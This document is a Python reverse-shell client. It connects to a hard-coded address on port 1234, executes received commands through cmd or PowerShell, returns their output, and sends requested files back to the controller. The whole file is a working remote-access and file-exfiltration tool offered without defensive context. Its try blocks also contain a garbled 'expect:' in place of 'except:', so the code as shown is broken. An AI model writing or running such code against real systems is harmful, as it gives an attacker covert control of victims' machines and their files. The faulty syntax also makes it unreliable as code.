import os
import socket
import subprocess
import random
import sys


def download(s,data):
     filename=str(s.recv(1024),"utf-8")
     with open(filename,"rb") as file:
          while data := file.read(1024):
              s.sendall(data)

          
          
def cmd(s,data):
     try:
         if data[:2].decode("utf-8")=="cd":
              cd(s,data)
         elif data[:8].decode("utf-8")=="download":
              download(s,data)
         else:
              cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
              output=cmd.stdout.read()+cmd.stderr.read()
              output=str(output,"utf-8")
              string3=str.encode(output+os.getcwd()+'>',"utf-8")
              s.sendall(string3)
     expect:
         print("An Erorr is Occured")
         s.close()
         sys.exit()

def cd(s,data):
     os.chdir(data[3:].decode("utf-8"))
     s.sendall(str.encode("\n"+os.getcwd()+'>',"utf-8"))
                
                
def powershell(s,data):
     try:
         if data[:2].decode("utf-8")=="cd":
               cd(s,data)
         elif data[:8].decode("utf-8")=="download":
               download(s,data)
         else:
               p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
               output=p.stdout.read()+p.stderr.read()
               string3=str.encode(output+os.getcwd()+'>',"utf-8")
               s.sendall(string3)
     expect:
          print("An Error is occured")
          s.close()
          sys.exit()


def connect():
   s=socket.socket()
   host="192.168.1.67"
   port=1234
   s.connect((host,port))
   choice=s.recv(1024)
   choice=choice.decode("utf-8")
   return (choice,s)


def main():
     c,s=connect()
     while True:
        try:
           data=s.recv(32000)
           if len(data) > 0:
               if c=="CMD":
                    cmd(s,data)
               elif c=="PS":
                    powershell(s,data)   
               else:
                    sys.exit("WRONG CHOICE")    
        except :
          s.close()
          sys.exit()
          break
     s.close()
     
main()
